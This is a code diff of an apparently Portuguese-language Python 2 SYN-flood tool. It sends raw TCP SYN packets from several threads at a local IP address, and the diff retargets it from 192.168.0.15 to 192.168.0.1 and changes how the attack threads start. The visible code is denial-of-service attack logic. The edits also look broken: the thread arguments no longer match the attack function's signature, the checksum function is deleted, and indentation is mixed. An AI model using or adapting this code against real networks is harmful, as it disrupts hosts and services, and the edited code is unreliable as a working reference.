@@ -1,24 +1,6 @@
 import socket
 import time
-import socket, sys, random
-from struct import *
 from threading import Thread
-import time 
-
-# checksum functions needed for calculation checksum
-def checksum(msg):
-    s = 0
-    # loop taking 2 characters at a time
-    for i in range(0, len(msg), 2):
-        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
-        s = s + w
-     
-    s = (s>>16) + (s & 0xffff);
-    #s = s + (s >> 16);
-    #complement and mask to 4 byte short
-    s = ~s & 0xffff
-     
-    return s
 
 def show_begin(ip_dest):
     import time
@@ -108,10 +90,9 @@ def attack(numero_thread, dest_ip):
         source_address = socket.inet_aton( source_ip )
         tcp_length = len(tcp_header)
 
-        if contador > 49999:
-            print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
-            contador=0
-
+    	if contador > 49999:
+        	print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
+        	contador=0
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
         psh = psh + tcp_header;
          
@@ -143,32 +124,26 @@ s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 HOST = '192.168.0.15'
 s.bind(('', 0))
 
+
+
 countdown(3)
 
-#Por aqui o endereco do IP que sera atacado
-dest_ip = '192.168.0.15'
+i = 0
 
-#Numero fixo de threads por enquanto, utilizaram a funcao atacck por enquanto
-ataque2 = Thread(target=attack,args=[1,dest_ip])
-ataque3 = Thread(target=attack,args=[2,dest_ip])
-ataque4 = Thread(target=attack,args=[3,dest_ip])
+dest_ip = '192.168.0.1'
 
-#Entra em um loop infinito
+ataque2 = Thread(target=attack,args=[6001])
+ataque3 = Thread(target=attack,args=[7002])
+ataque4 = Thread(target=attack,args=[8003])
+		
+
 while 1:
-
-	#Canal onde ira receber mensagem	
 	msg = s.recvfrom(12000)
-
-	#Se receber mensagem
 	if msg:
-
-		#Mostra que esta atacando
 		show_begin(dest_ip)
-
-		#Inicia a threads do ataque
 		ataque2.start()
- 		ataque3.start ()
-        ataque4.start ()
+		ataque3.start()
+		ataque4.start()
 		
 
 
